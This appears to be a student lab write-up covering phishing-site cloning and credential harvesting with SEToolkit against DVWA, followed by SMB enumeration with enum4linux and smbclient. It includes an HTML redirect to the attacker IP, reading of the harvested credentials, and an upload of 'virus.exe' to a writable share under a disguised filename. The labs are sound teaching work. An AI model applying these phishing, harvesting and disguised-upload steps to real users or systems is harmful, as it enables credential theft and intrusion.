# SEToolkit, SMBClient & Enum4Linux Labs

This repository documents two **ethical hacking labs** carried out in a **controlled and authorized lab environment** for learning and academic purposes. The focus of these labs is to understand common attack techniques and their security implications.

---

##  Labs Overview

### Included Labs
- **Website Cloning with SEToolkit**
- **SMB Enumeration and Analysis with Enum4Linux**

Each lab contains:
- Detailed step-by-step procedures  
- Commands executed during the lab  
- Screenshots (where applicable)  
- Observations and conclusions  

---

##  Disclaimer

All exercises were performed **only within a permitted lab setup**.  
These techniques must **never** be used against real-world systems without explicit authorization.

---

##  Lab 1: Website Cloning using SEToolkit

### Objective
To learn how website cloning and credential harvesting attacks function, and to understand why phishing awareness is critical for users.

### Tools Utilized
- Kali Linux  
- SEToolkit  

### Lab Environment
- **Attacker Machine:** Kali Linux  
- **Target Application:** DVWA (Lab Virtual Machine)  
- **Attacker IP Address:** `10.6.6.1`

---

### Step 1: Launch SEToolkit
```bash
sudo su
setoolkit
This command starts the Social-Engineer Toolkit interface.


### Step 2: Choose Attack Options
From the SEToolkit menu, the following selections were made:

mathematica
Copy code
1 → Social-Engineering Attacks
2 → Website Attack Vectors
3 → Credential Harvester Attack Method
2 → Site Cloner

### Step 3: Configure Site Cloning
Enter attacker IP address:

Copy code
10.6.6.1
Enter the target website to clone:

arduino
Copy code
http://dvwa.vm
The target site is cloned and hosted locally on the attacker machine.

### Step 4: Create a Redirect HTML File
A basic HTML redirect page was created to forward users to the cloned website.

HTML Content:

html
Copy code
<html>
<head>
<meta http-equiv="refresh" content="0; url=http://10.6.6.1/" />
</head>
</html>
Steps:

Open a text editor

Paste the HTML code

Save as ladies.html on the Desktop

Open the file in a web browser

### Step 5: Test Credential Harvesting
Test credentials were entered to verify functionality:

Email: ladies@gmail.com

Password: 1234

These credentials were purely for demonstration and testing.

### Step 6: Stop the Attack
Terminate SEToolkit using:

bash
Copy code
Ctrl + C
Exit the toolkit by entering:

Copy code
99
99
99
99
### Step 7: Review Captured Data
bash
Copy code
cat /root/.set/reports/"2025-12-14 13:34:09.326665.xml"
This report contains the harvested test credentials.

Findings
The cloned website closely resembled the original

Credentials were captured successfully

Demonstrates how phishing attacks can mislead users

Key Lessons
Website cloning is a widely used phishing technique

Verifying URLs is critical

User awareness is an effective security control


### Lab 2: SMB Enumeration with Enum4Linux
Objective
To detect SMB misconfigurations by enumerating users, shares, and access permissions on a target system.

Tools Utilized
Nmap

Enum4Linux

smbclient

Lab Environment
Attacker Machine: Kali Linux

Target IP Address: 172.17.0.2

### Step 1: Network Discovery
bash
Copy code
nmap -sN 172.17.0.0/24
Used to identify active hosts on the local network.

### Step 2: SMB Enumeration with Enum4Linux
Enumerate Users

bash
Copy code
enum4linux -U 172.17.0.2
Enumerate Machines

bash
Copy code
enum4linux -M 172.17.0.2
List SMB Shares

bash
Copy code
enum4linux -S 172.17.0.2
Verbose Share Enumeration

bash
Copy code
enum4linux -Sv 172.17.0.2
Password Policy Enumeration

bash
Copy code
enum4linux -P 172.17.0.2
Complete Enumeration

bash
Copy code
enum4linux -a 172.17.0.2

### Step 3: Access SMB Shares with smbclient
List Available Shares

bash
Copy code
smbclient -L //172.17.0.2/
Access Printer Share

bash
Copy code
smbclient //172.17.0.2/print$
Access Temporary Share

bash
Copy code
smbclient //172.17.0.2/tmp

### Step 4: File Upload Test (Simulation)
A test file was created to demonstrate risks associated with writable SMB shares.

bash
Copy code
nano virus.exe
Upload the file with a disguised name:

bash
Copy code
put virus.exe group_work.txt
 The file was non-malicious and used strictly for lab demonstration.

Findings
SMB shares were accessible with minimal restrictions

Enumeration revealed valuable system information

Writable shares significantly increase security risk

Key Lessons
SMB services require strict configuration

Enumeration is a critical phase of an attack

Applying least-privilege principles reduces exposure

 Conclusion
These labs provided hands-on experience with common real-world attack techniques such as social engineering-based website cloning and SMB service enumeration.

The website cloning exercise illustrated how attackers can exploit user trust through visually convincing fake pages, while the SMB enumeration lab demonstrated how misconfigured services can expose sensitive information like users, shares, and permissions.

Overall, these labs reinforced the importance of:

Security awareness and user education

Secure system and network configurations

Regular vulnerability assessments

Ethical and responsible use of security tools


All activities were performed strictly within a controlled lab environment for educational purposes. The skills and knowledge gained will be applied toward defensive security practices and ethical penetration testing.
